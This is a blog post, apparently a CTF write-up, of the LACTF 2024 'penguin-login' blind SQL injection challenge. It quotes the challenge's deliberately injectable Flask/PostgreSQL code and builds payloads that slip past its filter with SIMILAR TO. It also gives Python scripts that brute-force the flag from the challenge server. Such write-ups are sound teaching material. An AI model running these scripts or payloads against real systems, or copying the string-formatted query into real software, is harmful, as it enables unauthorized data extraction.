<!DOCTYPE html>
<html lang="en" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Penguin Login - LACTF 2024 | Tiziano Caruana</title>
<meta name="keywords" content="writeup, CTFs, lactf-2024">
<meta name="description" content="Constructing a custom payload to bypass filters with the help of documentations">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/writeups/lactf-2024/penguin_login/">
<meta name="google-site-verification" content="-NRlyU37XYTZJ4WyeO8svRuXL8xXbOUAqLrx-qYbEpw">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNvCmIE7HEiLhByQCf2_uMI9ENQNto_kSmOjKv-BusCjO355SvJeQZmWMPBXS6wwaH7nQ&amp;usqp=CAU">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/writeups/lactf-2024/penguin_login/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="Penguin Login - LACTF 2024" />
<meta property="og:description" content="Constructing a custom payload to bypass filters with the help of documentations" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/posts/writeups/lactf-2024/penguin_login/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-02-18T22:20:00+02:00" />
<meta property="article:modified_time" content="2024-02-18T22:20:00+02:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Penguin Login - LACTF 2024"/>
<meta name="twitter:description" content="Constructing a custom payload to bypass filters with the help of documentations"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Penguin Login - LACTF 2024",
      "item": "http://localhost:1313/posts/writeups/lactf-2024/penguin_login/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Penguin Login - LACTF 2024",
  "name": "Penguin Login - LACTF 2024",
  "description": "Constructing a custom payload to bypass filters with the help of documentations",
  "keywords": [
    "writeup", "CTFs", "lactf-2024"
  ],
  "articleBody": "penguin-login February 2024 - Blind SQL injection\n‚ÄúI got tired of people leaking my password from the db so I moved it out of the db.‚Äù\nPrior knowledge: basic web-related knowledge, SQL\nContext We are provided with the link to the challenge website and the corresponding source code. The website is quite simple, and the usage of its features is straightforward: All the code is in app.py:\n... allowed_chars = set(string.ascii_letters + string.digits + \" 'flag{a_word}'\") forbidden_strs = [\"like\"] @cache def get_database_connection(): # Get database credentials from environment variables db_user = os.environ.get(\"POSTGRES_USER\") db_password = os.environ.get(\"POSTGRES_PASSWORD\") db_host = \"db\" # Establish a connection to the PostgreSQL database connection = psycopg2.connect(user=db_user, password=db_password, host=db_host) return connection with app.app_context(): conn = get_database_connection() create_sql = \"\"\" DROP TABLE IF EXISTS penguins; CREATE TABLE IF NOT EXISTS penguins ( name TEXT ) \"\"\" with conn.cursor() as curr: curr.execute(create_sql) curr.execute(\"SELECT COUNT(*) FROM penguins\") if curr.fetchall()[0][0] == 0: curr.execute(\"INSERT INTO penguins (name) VALUES ('peng')\") curr.execute(\"INSERT INTO penguins (name) VALUES ('emperor')\") curr.execute(\"INSERT INTO penguins (name) VALUES ('%s')\" % (flag)) conn.commit() @app.post(\"/submit\") def submit_form(): try: username = request.form[\"username\"] conn = get_database_connection() assert all(c in allowed_chars for c in username), \"no character for u uwu\" assert all( forbidden not in username.lower() for forbidden in forbidden_strs ), \"no word for u uwu\" with conn.cursor() as curr: curr.execute(\"SELECT * FROM penguins WHERE name = '%s'\" % username) result = curr.fetchall() if len(result): return \"We found a penguin!!!!!\", 200 return \"No penguins sadg\", 201 except Exception as e: return f\"Error: {str(e)}\", 400 # need to commit to avoid connection going bad in case of error finally: conn.commit() ... We know that the website uses Postgres as the RDBMS/SQL database, and that the flag is contained in the penguins table along with the penguins.\nThe code is straightforward: the first half deals only with connections and setup, while the submit endpoint checks that the characters entered by the user are part of the whitelist (letters, numbers, {}, and _), which effectively consists of the characters that can be part of the flag.\nThe ideal thought process A quick analysis of the code can already tell us everything we need to know, but why not play around with the only input available on the site?\nWe can thus see the differences in response depending on the input. If a penguin is found, a status code is returned, while if nothing is found, we get a 201.\nAs we can see in line 63, the query is constructed using string interpolation with %-formatting which allows for user input. This approach is vulnerable to SQL injection, and the challenge author has simulated a makeshift solution through a system of whitelisting e blacklisting.\nExploiting the vulnerability There‚Äôs no way to use comments! How will we do it??? üò≠üò≠üò≠ In this case, it‚Äôs not a tragedy, since we only need to get rid of one apostrophe. We just need to close the payloads with a string. This means that instead of using the classic logic SQLi test ' OR 1=1, we‚Äôll use its alternative ' OR 'a'='a', without the final apostrophe since we‚Äôll use the last ‚Äòa‚Äô to ‚Äúburn‚Äù the extra apostrophe present in the code.\nNice thinking, the problem is that the equal sign is not whitelisted. We can‚Äôt even use LIKE instead of the equal sign, since it‚Äôs blacklisted.\nIn SQL, we can indicate boolean values with 0 and 1, and this applies even if they are strings. So, just like ' OR 1 returns TRUE, so does ' OR '1.\nIt works! Now we just have to adjust the injection in order to exfiltrate the flag.\nBut there‚Äôs no way to use LIKE (I‚Äôm not completely sure about this one, but I did not use it. P.S. Yeah, it wasn‚Äôt intended to use LIKE by bypassing the blacklist). Searching on the internet for LIKE alternative in postgreSQL, among the top results, I found sections 6.6 and 9.7 of the documentation, both concerning pattern matching. In these parts of the documentation, an alternative to the LIKE statement is indicated, namely SIMILAR TO, which differs from the former only in the interpretation of RegEx. For our purposes, there is no difference.\nAt this point, we have practically won, and all that‚Äôs left is to build the payload and the corresponding script. Probably SQLmap already had something available for the occasion, but I don‚Äôt really care.\nTips for beginners At this point, for a player with a decent level of experience, the challenge is already solved. However, if it‚Äôs one of the first times solving a SQLi UNION-based challenge, it‚Äôs possible to take a few extra intermediate steps to make it clearer what is being executed by the DBMS and how the payload should be constructed.\nCopying the vulnerable line, and playing with it In the line \"SELECT * FROM penguins WHERE name = '%s'\" % username, our input is directly inserted in place of %s. To ensure that you are writing a sensible payload, you can first try writing it in place of the placeholder:\nSELECT * FROM penguins WHERE name = '' OR '1' Make sure not to use the mouse or arrow keys (in other words, don‚Äôt move the cursor) while you‚Äôre testing your inputs ;)\nUnderstanding if the payload makes sense Instead of blindly using a command/trick/workaround/technique that you see for the first time, make sure first that it works as you imagine in a more ‚Äúrelaxed‚Äù context, where you can write and access outputs and error logs without limitations. Discovering that the query returned false because you were not running the command correctly, or that it errored because the command was related to another DBMS, is particularly frustrating.\nThere are services (like OneCompiler, that allow you to execute code directly online. Always make sure 100% when using these services that you have selected the right DBMS.\nProceed in phases It‚Äôs helpful to reason in phases the first few times. In mathematics, we can start skipping steps during calculations, but only because we‚Äôve become familiar enough:\nIdentify your goal: in this case, ‚ÄúI want to get the flag‚Äù -\u003e ‚ÄúI want to get all the characters of the record that starts with the flag format and ends with }‚Äù. Write it down as you would normally: SELECT name WHERE name LIKE 'lactf{%}'. Rewrite it bypassing whitelist and blacklist: SELECT name WHERE name SIMILAR TO 'lactf{_}' with as many _ as there are characters in the flag. Combine the two techniques shown previously: SELECT name WHERE name SIMILAR TO 'lactf{_}' + SELECT * FROM penguins WHERE name = '%s' -\u003e remembering that the only column in the DB is name, and that we can only write commands in place of %s: SELECT * FROM penguins WHERE name = '' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}' The payload will simply be what we wrote in this last phase, which is ' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}\nConstructing the payload At this point, all we have to do is construct a UNION with a SIMILAR TO instead of the more popular LIKE. In my case: ' UNION SELECT name WHERE name SIMILAR TO 'lactf{_}.\nI‚Äôm not sure if there was a more convenient way to get the length of the flag, but I just added underscores until I got a positive result. These are the payloads useful for extracting the flag, modified from those used during the competition:\nfindlen.py\nfrom requests import * URL = \"https://penguin.chall.lac.tf/\" s = Session() payloadStart = \"' OR name SIMILAR TO 'lactf{\" payloadEnd = \"\" i = 0 while True: payload = payloadStart + payloadEnd + \"}\" r = s.post(URL + \"submit\", data={\"username\": payload}) if r.status_code == 200: print(\"worked: \", payload) break else: payloadEnd += \"_\" print(\"failed: \", payload) findflag.py\nfrom requests import * from string import digits, ascii_uppercase, ascii_lowercase URL = \"https://penguin.chall.lac.tf/\" s = Session() payloadStart = \"' OR name SIMILAR TO 'lactf{\" payloadEnd = \"______________________________________\" i = 0 while True: if len(payloadEnd) \u003e 0: payloadEnd = payloadEnd[:-1] else: break for c in digits + ascii_lowercase + ascii_uppercase: payload = payloadStart + c + payloadEnd + \"}\" r = s.post(URL + \"submit\", data={\"username\": payload}) if r.status_code == 200: print(\"worked: \", payload) payloadStart += c break else: print(\"failed: \", payload) else: payloadStart += \"_\" print(\"skipping: \", payload) Due to infrastructure issues, the first character of the flag couldn‚Äôt be retrieved. I had to guess it (in quite a few attempts xd). P.S. It seems like there was a way to exfiltrate the first character of the flag. I‚Äôll act like I didn‚Äôt see that.\nlactf{90stgr35_3s_n0t_l7k3_th3_0th3r_dbs_0w0}\nHow it actually went during the CTF One evening, I was at the gym to vent the frustration of not being able to find a rock on the west coast of California, United States (I love OSINT). Just before leaving, I heard that one of my teammates was having a bad time with an SQLi. ‚ÄúLet me solve it,‚Äù I wrote to him.\nI hadn‚Äôt read the code yet when I received a message on Discord from said player, expressing interest in solving the challenge. ‚ÄúJust use _‚Äù, I said jokingly. I didn‚Äôt know that the character was actually whitelisted.\nMy teammate had already discovered the existence of SIMILAR TO, so once I got home, I only had to deal with writing the payload.\nPayload used during the CTF findlen.py\nfrom requests import * from bs4 import BeautifulSoup URL = \"https://penguin.chall.lac.tf/\" s = Session() payloadStart = \"' OR name SIMILAR TO 'lactf{\" payloadEnd = \"\" i = 0 while True: payload = payloadStart + payloadEnd + \"}\" r = s.post(URL + \"submit\", data={\"username\": payload}) soup = BeautifulSoup(r.text, \"html.parser\") if \"We found a penguin\" in soup.get_text(): print(\"worked: \", payload) break else: payloadEnd += \"_\" print(\"failed: \", payload) findflag.py\nfrom requests import * from bs4 import BeautifulSoup from string import digits, ascii_uppercase, ascii_lowercase URL = \"https://penguin.chall.lac.tf/\" s = Session() payloadStart = \"' OR name SIMILAR TO 'lactf{\" payloadEnd = \"______________________________________\" i = 0 while True: payloadEnd = payloadEnd[:-1] for c in digits + ascii_lowercase + ascii_uppercase + \"!-@\": payload = payloadStart + c + payloadEnd + \"}\" r = s.post(URL + \"submit\", data={\"username\": payload}) soup = BeautifulSoup(r.text, \"html.parser\") if \"We found a penguin\" in soup.get_text(): print(\"worked: \", payload) payloadStart += c break else: print(\"failed: \", payload) else: print(\"end: \", payload) break I was too lazy to press F12 while playing around, so I just based my final payload on the \"We found a penguin!!!!!\" response.\nFeedback I‚Äôm open to questions, feedbacks, and DMs in general! @titto_caru on Discord\n",
  "wordCount" : "1752",
  "inLanguage": "en",
  "datePublished": "2024-02-18T22:20:00+02:00",
  "dateModified": "2024-02-18T22:20:00+02:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/writeups/lactf-2024/penguin_login/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Tiziano Caruana",
    "logo": {
      "@type": "ImageObject",
      "url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNvCmIE7HEiLhByQCf2_uMI9ENQNto_kSmOjKv-BusCjO355SvJeQZmWMPBXS6wwaH7nQ\u0026usqp=CAU"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Tiziano Caruana (Alt + H)">Tiziano Caruana</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="http://localhost:1313/it/" title="Italiano"
                            aria-label="Italiano">Italiano</a>
                    </li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/about_me" title="About me">
                    <span>About me</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/writeup" title="Writeup">
                    <span>Writeup</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;¬ª&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      Penguin Login - LACTF 2024
    </h1>
    <div class="post-description">
      Constructing a custom payload to bypass filters with the help of documentations
    </div>
    <div class="post-meta"><span title='2024-02-18 22:20:00 +0200 +0200'>February 18, 2024</span>&nbsp;¬∑&nbsp;9 min&nbsp;¬∑&nbsp;1752 words

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#penguin-login" aria-label="penguin-login">penguin-login</a><ul>
                        
                <li>
                    <a href="#context" aria-label="Context">Context</a></li>
                <li>
                    <a href="#the-ideal-thought-process" aria-label="The ideal thought process">The ideal thought process</a><ul>
                        
                <li>
                    <a href="#exploiting-the-vulnerability" aria-label="Exploiting the vulnerability">Exploiting the vulnerability</a><ul>
                        
                <li>
                    <a href="#tips-for-beginners" aria-label="Tips for beginners">Tips for beginners</a><ul>
                        
                <li>
                    <a href="#copying-the-vulnerable-line-and-playing-with-it" aria-label="Copying the vulnerable line, and playing with it">Copying the vulnerable line, and playing with it</a></li>
                <li>
                    <a href="#understanding-if-the-payload-makes-sense" aria-label="Understanding if the payload makes sense">Understanding if the payload makes sense</a></li>
                <li>
                    <a href="#proceed-in-phases" aria-label="Proceed in phases">Proceed in phases</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#constructing-the-payload" aria-label="Constructing the payload">Constructing the payload</a></li>
                <li>
                    <a href="#how-it-actually-went-during-the-ctf" aria-label="How it actually went during the CTF">How it actually went during the CTF</a><ul>
                        
                <li>
                    <a href="#payload-used-during-the-ctf" aria-label="Payload used during the CTF">Payload used during the CTF</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#feedback" aria-label="Feedback">Feedback</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="penguin-login">penguin-login<a hidden class="anchor" aria-hidden="true" href="#penguin-login">#</a></h1>
<p><em>February 2024 - Blind SQL injection</em></p>
<blockquote>
<p>&ldquo;I got tired of people leaking my password from the db so I moved it out of the db.&rdquo;</p>
</blockquote>
<p><em>Prior knowledge: basic web-related knowledge, SQL</em></p>
<h2 id="context">Context<a hidden class="anchor" aria-hidden="true" href="#context">#</a></h2>
<p>We are provided with the link to the challenge website and the corresponding source code. The website is quite simple, and the usage of its features is straightforward:
<img loading="lazy" src="/writeups/lactf-2024/penguin-login/img/website.png" alt="website home page"  />
</p>
<p>All the code is in <code>app.py</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>allowed_chars <span style="color:#f92672">=</span> set(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; &#39;flag</span><span style="color:#e6db74">{a_word}</span><span style="color:#e6db74">&#39;&#34;</span>)
</span></span><span style="display:flex;"><span>forbidden_strs <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;like&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@cache</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_database_connection</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Get database credentials from environment variables</span>
</span></span><span style="display:flex;"><span>    db_user <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;POSTGRES_USER&#34;</span>)
</span></span><span style="display:flex;"><span>    db_password <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;POSTGRES_PASSWORD&#34;</span>)
</span></span><span style="display:flex;"><span>    db_host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;db&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Establish a connection to the PostgreSQL database</span>
</span></span><span style="display:flex;"><span>    connection <span style="color:#f92672">=</span> psycopg2<span style="color:#f92672">.</span>connect(user<span style="color:#f92672">=</span>db_user, password<span style="color:#f92672">=</span>db_password, host<span style="color:#f92672">=</span>db_host)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> connection
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> app<span style="color:#f92672">.</span>app_context():
</span></span><span style="display:flex;"><span>    conn <span style="color:#f92672">=</span> get_database_connection()
</span></span><span style="display:flex;"><span>    create_sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        DROP TABLE IF EXISTS penguins;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        CREATE TABLE IF NOT EXISTS penguins (
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            name TEXT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        )
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> conn<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> curr:
</span></span><span style="display:flex;"><span>        curr<span style="color:#f92672">.</span>execute(create_sql)
</span></span><span style="display:flex;"><span>        curr<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;SELECT COUNT(*) FROM penguins&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> curr<span style="color:#f92672">.</span>fetchall()[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            curr<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;INSERT INTO penguins (name) VALUES (&#39;peng&#39;)&#34;</span>)
</span></span><span style="display:flex;"><span>            curr<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;INSERT INTO penguins (name) VALUES (&#39;emperor&#39;)&#34;</span>)
</span></span><span style="display:flex;"><span>            curr<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;INSERT INTO penguins (name) VALUES (&#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;)&#34;</span> <span style="color:#f92672">%</span> (flag))
</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>commit()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.post</span>(<span style="color:#e6db74">&#34;/submit&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">submit_form</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;username&#34;</span>]
</span></span><span style="display:flex;"><span>        conn <span style="color:#f92672">=</span> get_database_connection()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> all(c <span style="color:#f92672">in</span> allowed_chars <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> username), <span style="color:#e6db74">&#34;no character for u uwu&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">assert</span> all(
</span></span><span style="display:flex;"><span>            forbidden <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> username<span style="color:#f92672">.</span>lower() <span style="color:#66d9ef">for</span> forbidden <span style="color:#f92672">in</span> forbidden_strs
</span></span><span style="display:flex;"><span>        ), <span style="color:#e6db74">&#34;no word for u uwu&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> conn<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> curr:
</span></span><span style="display:flex;"><span>            curr<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;SELECT * FROM penguins WHERE name = &#39;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;&#34;</span> <span style="color:#f92672">%</span> username)
</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> curr<span style="color:#f92672">.</span>fetchall()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(result):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;We found a penguin!!!!!&#34;</span>, <span style="color:#ae81ff">200</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;No penguins sadg&#34;</span>, <span style="color:#ae81ff">201</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># need to commit to avoid connection going bad in case of error</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">finally</span>:
</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>commit()
</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
</span></span></code></pre></div><p>We know that the website uses Postgres as the <a href="https://cloud.google.com/learn/what-is-a-relational-database?hl=en">RDBMS</a>/<a href="https://www.solarwinds.com/resources/it-glossary/sql-database">SQL database</a>, and that the flag is contained in the penguins table along with the penguins.</p>
<p>The code is straightforward: the first half deals only with connections and setup, while the <code>submit</code> endpoint checks that the characters entered by the user are part of the whitelist (letters, numbers, <code>{}</code>, and <code>_</code>), which effectively consists of the characters that can be part of the flag.</p>
<h2 id="the-ideal-thought-process">The ideal thought process<a hidden class="anchor" aria-hidden="true" href="#the-ideal-thought-process">#</a></h2>
<p>A quick analysis of the code can already tell us everything we need to know, but why not play around with the only input available on the site?</p>
<p><img loading="lazy" src="/writeups/lactf-2024/penguin-login/vid/code200.gif" alt="code 200 example"  />
</p>
<p><img loading="lazy" src="/writeups/lactf-2024/penguin-login/vid/code201.gif" alt="code 201 example"  />
</p>
<p>We can thus see the differences in response depending on the input. If a penguin is found, a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status">status code</a> is returned, while if nothing is found, we get a 201.</p>
<p>As we can see in line 63, the query is constructed using string interpolation with <a href="https://www.programiz.com/python-programming/string-interpolation#:~:text=Example%203">%-formatting</a> which allows for user input. This approach is vulnerable to <a href="https://stackoverflow.com/questions/51960654/python-string-formatting-percentage-symbol-after-string-substituion">SQL injection</a>, and the challenge author has simulated a makeshift solution through a system of <a href="https://www.ninjaone.com/it-hub/endpoint-security/what-is-input-sanitization/#:~:text=Input%20sanitization%20methods">whitelisting e blacklisting</a>.</p>
<h3 id="exploiting-the-vulnerability">Exploiting the vulnerability<a hidden class="anchor" aria-hidden="true" href="#exploiting-the-vulnerability">#</a></h3>
<p>There&rsquo;s no way to use comments! How will we do it??? üò≠üò≠üò≠
In this case, it&rsquo;s not a tragedy, since we only need to get rid of one apostrophe. We just need to close the payloads with a string. This means that instead of using the classic logic SQLi test <code>' OR 1=1</code>, we&rsquo;ll use its alternative <code>' OR 'a'='a'</code>, without the final apostrophe since we&rsquo;ll use the last &lsquo;a&rsquo; to &ldquo;burn&rdquo; the extra apostrophe present in the code.</p>
<p>Nice thinking, the problem is that the equal sign is not whitelisted. We can&rsquo;t even use <code>LIKE</code> instead of the equal sign, since it&rsquo;s blacklisted.</p>
<p>In SQL, we can indicate boolean values with 0 and 1, and this applies even if they are strings. So, just like <code>' OR 1</code> returns <code>TRUE</code>, so does <code>' OR '1</code>.</p>
<p><img loading="lazy" src="/writeups/lactf-2024/penguin-login/vid/injTest.gif" alt="First injection test"  />
</p>
<p>It works! Now we just have to adjust the injection in order to exfiltrate the flag.</p>
<p>But there&rsquo;s no way to use <code>LIKE</code> (I&rsquo;m not completely sure about this one, but I did not use it. P.S. Yeah, it wasn&rsquo;t intended to use LIKE by bypassing the blacklist). Searching on the internet for <em>LIKE alternative in postgreSQL</em>, among the top results, I found sections <a href="https://www.postgresql.org/docs/7.3/functions-matching.html#:~:text=6.6.%20Pattern%20Matching">6.6</a> and <a href="https://www.postgresql.org/docs/current/functions-matching.html#FUNCTIONS-MATCHING">9.7</a> of the documentation, both concerning pattern matching. In these parts of the documentation, an alternative to the <code>LIKE</code> statement is indicated, namely <code>SIMILAR TO</code>, which differs from the former only in the interpretation of RegEx. For our purposes, there is no difference.</p>
<p>At this point, we have practically won, and all that&rsquo;s left is to build the payload and the corresponding script. Probably SQLmap already had something available for the occasion, but I don&rsquo;t really care.</p>
<h4 id="tips-for-beginners">Tips for beginners<a hidden class="anchor" aria-hidden="true" href="#tips-for-beginners">#</a></h4>
<p>At this point, for a player with a decent level of experience, the challenge is already solved. However, if it&rsquo;s one of the first times solving a SQLi UNION-based challenge, it&rsquo;s possible to take a few extra intermediate steps to make it clearer what is being executed by the DBMS and how the payload should be constructed.</p>
<h5 id="copying-the-vulnerable-line-and-playing-with-it">Copying the vulnerable line, and playing with it<a hidden class="anchor" aria-hidden="true" href="#copying-the-vulnerable-line-and-playing-with-it">#</a></h5>
<p>In the line <code>&quot;SELECT * FROM penguins WHERE name = '%s'&quot; % username</code>, our input is directly inserted in place of <code>%s</code>. To ensure that you are writing a sensible payload, you can first try writing it in place of the placeholder:</p>
